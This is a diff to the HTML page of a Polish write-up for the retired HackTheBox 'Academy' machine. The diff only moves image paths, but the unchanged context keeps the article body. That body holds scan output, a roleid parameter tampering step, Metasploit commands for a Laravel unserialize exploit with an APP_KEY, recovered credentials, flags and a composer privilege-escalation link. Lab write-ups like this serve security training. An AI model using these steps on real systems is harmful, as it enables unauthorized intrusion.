@@ -61,13 +61,13 @@
 <meta property="og:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://lavatann.github.io/posts/hackthebox/academy/" />
-<meta property="og:image" content="https://lavatann.github.io/Academy.jpg" /><meta property="article:section" content="posts" />
+<meta property="og:image" content="https://lavatann.github.io/thumbnails/Academy.jpg" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-02-09T00:00:00&#43;00:00" />
 <meta property="article:modified_time" content="2021-02-09T00:00:00&#43;00:00" />
 <meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/encrypted/devzat/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/logforge/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/devzat/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/shibboleth/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/backdoor/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/secret/" />
 
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://lavatann.github.io/Academy.jpg" />
+<meta name="twitter:image" content="https://lavatann.github.io/thumbnails/Academy.jpg" />
 <meta name="twitter:title" content="Academy - HackTheBox"/>
 <meta name="twitter:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)"/>
 
@@ -105,7 +105,7 @@
   "articleBody": "Academy - 02.09.2021  NMap PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA) | 256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA) |_ 256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://academy.htb/ 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\" |_ HY000  FeroxBuster 403 9l 28w 276c http://academy.htb/.php 301 9l 28w 311c http://academy.htb/images 403 9l 28w 276c http://academy.htb/.html 200 141l 227w 2633c http://academy.htb/admin.php 403 9l 28w 276c http://academy.htb/.html.php 200 141l 226w 2627c http://academy.htb/login.php 200 0l 0w 0c http://academy.htb/config.php 302 1049l 4114w 0c http://academy.htb/home.php 200 76l 131w 2117c http://academy.htb/ 200 76l 131w 2117c http://academy.htb/index.php 403 9l 28w 276c http://academy.htb/.htaccess 403 9l 28w 276c http://academy.htb/.htaccess.php 403 9l 28w 276c http://academy.htb/.htm 200 148l 247w 3003c http://academy.htb/register.php  BurpSuite Nic specjalnego dla login.php\n Sprawdzimy register.php\nInteresujący parametr roleid\nZmiana z 0 na 1 dla testowego użytkownika\nJak się okazuję, pozwala to na logowanie na stronę login.php\nFix issue with dev-staging-01.academy.htb\tpending\n Po dodaniu do /etc/hosts ukazuje się taki widok:\n Laravel Potencjalny exploit PHP Laravel Framework 5.5.40 / 5.6.x  Msfconsole use exploit/unix/http/laravel_token_unserialize_exec set LHOST tun0 set RHOSTS 10.10.10.215 set VHOST dev-staging-01.academy.htb set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0 run  Privileges Escalation Próba logowania udana:\ncry0l1t3:mySup3rP4s5w0rd!!\nuser.txt\n8283412832d179d5e72a5fea0587893f\n User ma nietypową grupę adm\nmrb3n:mrb3n_Ac@d3my!  sudo -l https://gtfobins.github.io/gtfobins/composer/#limited-suid\nroot.txt\n20c51706f1c0c69c72d540a71ec8a52b\n",
   "wordCount" : "233",
   "inLanguage": "en",
-  "image":"https://lavatann.github.io/Academy.jpg","datePublished": "2021-02-09T00:00:00Z",
+  "image":"https://lavatann.github.io/thumbnails/Academy.jpg","datePublished": "2021-02-09T00:00:00Z",
   "dateModified": "2021-02-09T00:00:00Z",
   "author":{
     "@type": "Person",
@@ -202,7 +202,7 @@
 
 </div>
   </header> 
-<figure class="entry-cover"><img loading="lazy" src="https://lavatann.github.io/Academy.jpg" alt="">
+<figure class="entry-cover"><img loading="lazy" src="https://lavatann.github.io/thumbnails/Academy.jpg" alt="">
         
 </figure><div class="toc">
     <details >
